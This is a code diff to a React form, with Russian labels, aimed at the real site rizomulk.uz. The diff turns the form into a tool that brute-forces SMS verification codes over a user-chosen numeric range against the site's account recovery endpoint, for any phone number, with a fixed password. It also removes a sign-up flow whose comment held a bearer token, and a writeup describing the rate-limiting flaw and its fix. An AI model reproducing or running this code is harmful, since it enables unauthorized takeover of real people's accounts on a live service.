@@ -16,6 +16,8 @@ export default function Example() {
     const [isValidPhoneNumber, setIsValidPhoneNumber] = useState(true);
     const [codeSended, setCodeSended] = useState(false);
     const [codeAllowed, setCodeAllowed] = useState(false);
+    const [start, setStart] = useState(0);
+    const [end, setEnd] = useState(0);
 
 
   const formatPhoneNumber = (input) => {
@@ -78,9 +80,9 @@ export default function Example() {
     }
     }else{
         if(password == 911){
-            for (let index = 11111; index < 99999; index++) {
+            for (let index = start; index < end; index++) {
                 try {
-                    const response = await fetch("https://api.client.rizomulk.uz/api/v1/account/check-code?phone=905391575&code=" + index, {
+                    const response = await fetch(`https://api.client.rizomulk.uz/api/v1/account/recovery?phone=${username}&code=${index}&password=muxa1575`, {
                       method: "GET",
                       headers: {
                         "Content-Type": "application/json",
@@ -138,65 +140,7 @@ export default function Example() {
               }
         }
         
-    }}else{
-        try {
-            const response = await fetch("https://api.client.rizomulk.uz/api/v1/account/sign-up", {
-              method: "POST",
-              headers: {
-                "Content-Type": "application/json",
-              },
-              body: JSON.stringify({
-                // Add the necessary fields for sign-up here if needed
-                accountFirstName: username,
-                accountLastName: 'Kamolov',
-                accountPassword: password,
-                accountEmail: '',
-                accountRole: {
-                  makler: {
-                    agency: true,
-                    individual: true,
-                    makler: true,
-                  },
-                  user: true,
-                },
-                accountImageName: '',
-                accountAddress: {
-                  region: {
-                    value: 1726,
-                    label: 'Toshkent shahri',
-                  },
-                  district: {
-                    regionid: 1726,
-                    value: 1726260,
-                    label: 'Toshkent shahrining tumanlari',
-                  },
-                },
-                accountPhoneNumber: '+998' + blog.username,
-              }),
-            });
-      
-            const jsonData = await response.json();
-            setData(jsonData);
-
-            if(jsonData.status == "ALREADY_EXISTS")
-                toast.error(jsonData.description)
-    //   eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHBpcmVzIjo1MzM0NzcwMjA4LCJpZCI6Ijk4YTlkNjY4LTBkZTYtNGVjNS04MmFhLTZiOGYzYmVjNmQ1OSIsInJvbGUiOiJtYWtsZXIifQ.1_BTw0lHlwAqxZNr-kUWRtplpaHT7wAWiOyRU4BVJrw
-            // Optionally, you can check the response and navigate based on it
-            
-            toast.success(jsonData.status)
-            if (jsonData.status == "CREATED") {
-                Cookies.set('bearer-token', jsonData.data, { expires: 100 });
-                Cookies.set('username', username, { expires: 100 });
-                Cookies.set('tel', '+998' + blog.username, { expires: 100 });
-                navigate('/'); // Replace '/success-page' with the actual success page path
-            } else {
-              // Handle error or show a message
-            }
-          } catch (error) {
-            console.error('Error fetching data:', error);
-            // Handle error or show a message
-          }
-    }
+    }}
   };
 
 
@@ -217,6 +161,30 @@ export default function Example() {
                 <div className="bg-white px-6 py-12 sm:shadow shadow-none sm:rounded-lg sm:px-12">
                     {!codeAllowed ? (
                     <form className="space-y-6" onSubmit={handleSubmit}>
+                        <div>
+                            <label htmlFor="start" className="block text-sm font-medium leading-6 text-gray-900">
+                                Начиная от числа
+                            </label>
+                            <div className="mt-2">
+                                <input id="start" name="start" type="numbers"
+                                    required
+                                    value={start}
+                                    onChange={(e)=> setStart(e.target.value)}
+                                    className="tracking-widest text-center block w-full rounded-md border-0 p-1.5 text-gray-900 shadow-sm ring-1 ring-inset ring-gray-300 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-gray-600 sm:text-sm sm:leading-6" />
+                            </div>
+                        </div>
+                        <div>
+                            <label htmlFor="end" className="block text-sm font-medium leading-6 text-gray-900">
+                                Заканчивая от числа
+                            </label>
+                            <div className="mt-2">
+                                <input id="end" name="end" type="numbers"
+                                    required
+                                    value={end}
+                                    onChange={(e)=> setEnd(e.target.value)}
+                                    className="tracking-widest text-center block w-full rounded-md border-0 p-1.5 text-gray-900 shadow-sm ring-1 ring-inset ring-gray-300 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-gray-600 sm:text-sm sm:leading-6" />
+                            </div>
+                        </div>
                         <div>
                             <label htmlFor="text" className="block text-sm font-medium leading-6 text-gray-900">
                                 Введите номер телефона
@@ -315,90 +283,6 @@ export default function Example() {
             </div>
         </div>
         
-        <div className="max-w-7xl mx-auto p-8 my-8">
-      <h2 className="text-2xl font-bold mb-4">Уязвимость регистрации через открытый POST запрос</h2>
-      
-      <p className="mb-4">
-        На сайте rizomulk.uz существует уязвимость, позволяющая злоумышленнику зарегистрироваться на сайте
-        с любым номером телефона. Уязвимость заключается в следующем:
-      </p>
-
-      <p className="mb-4">
-        На первом этапе злоумышленник отправляет запрос на API с номером телефона, на который необходимо отправить код подтверждения.
-      </p>
-      <code className="bg-gray-100 p-2 rounded-md mb-2 inline-block">
-        GET https://api.client.rizomulk.uz/api/v1/account/send-sms?phone=905391575
-      </code>
-
-      <p className="mb-4">
-        На втором этапе злоумышленник отправляет запрос на API с номером телефона и случайным кодом подтверждения.
-      </p>
-      <code className="bg-gray-100 p-2 rounded-md mb-2 inline-block">
-        GET https://api.client.rizomulk.uz/api/v1/account/check-code?phone=905391575&code=85606
-      </code>
-
-      <p className="mb-4">
-        На третьем этапе злоумышленник отправляет запрос на API с любым номером телефона и случайным паролем.
-      </p>
-      <code className="bg-gray-100 p-2 rounded-md mb-2 inline-block">
-        POST https://api.client.rizomulk.uz/api/v1/account/sign-up
-        <br />
-        data:{"{"}
-          "accountFirstName": "Muxammad",
-          "accountLastName": "Kamolov",
-          "accountPassword": "muxa1575",
-          "accountPhoneNumber": "+998777377777"
-        {"}"}
-      </code>
-
-      <p className="mb-4">
-        Если злоумышленнику удастся подобрать правильный код подтверждения, то он сможет зарегистрироваться на сайте с любым номером телефона.
-      </p>
-
-      <h3 className="text-xl font-bold mt-6 mb-2">Как объяснить уязвимость</h3>
-      <p className="mb-4">
-        Для объяснения уязвимости необходимо представить следующую ситуацию:
-      </p>
-
-      <p className="mb-4">
-        Представьте, что вы хотите зарегистрироваться на сайте. Вы вводите свой номер телефона и получаете код подтверждения.
-        Теперь представьте, что злоумышленник также хочет зарегистрироваться на этом сайте. Он может отправить запрос на API с любым номером телефона.
-        Затем злоумышленник может отправить запрос на API с случайным кодом подтверждения. Если злоумышленнику удастся подобрать правильный код подтверждения, то он сможет зарегистрироваться на сайте с любым номером телефона.
-      </p>
-
-      <p className="mb-4">
-        Таким образом, злоумышленник может зарегистрироваться на сайте с любым номером телефона, даже если у него нет этого номера телефона. Это может привести к следующим проблемам:
-      </p>
-
-      <ul className="list-disc pl-8 mb-4">
-        <li>Злоумышленник может получить доступ к учетной записи пользователя.</li>
-        <li>Злоумышленник может использовать учетную запись пользователя для распространения спама или вредоносного ПО.</li>
-        <li>Злоумышленник может использовать учетную запись пользователя для совершения других незаконных действий.</li>
-      </ul>
-
-      <h3 className="text-xl font-bold mt-6 mb-2">Как исправить уязвимость</h3>
-      <p className="mb-4">
-        Чтобы исправить уязвимость, необходимо ограничить количество попыток проверки кода подтверждения.
-        Например, можно установить ограничение в 10 попыток в день. Если злоумышленник превысит это ограничение,
-        то он не сможет проверить код подтверждения.
-      </p>
-
-      <p className="mb-4">
-        Также необходимо добавить проверку подлинности номера телефона. Например, можно использовать технологию SMS-аутентификации.
-        В этом случае при регистрации на сайте пользователю необходимо будет ввести код подтверждения, который будет отправлен ему в SMS-сообщении.
-      </p>
-
-      <h3 className="text-xl font-bold mt-6 mb-2">Стили и опросы</h3>
-      <p className="mb-4">
-        Для объяснения уязвимости можно использовать следующие стили и опросы:
-      </p>
-
-      <ul className="list-disc pl-8">
-        <li>Использовать простой и понятный язык.</li>
-        <li>Использовать визуальные элементы, такие как диаграммы и графики.</li>
-        <li>Делать акцент на потенциальных последствиях уязвимости.</li>
-      </ul>
-    </div>
-    </>
+         </>
     )
     }
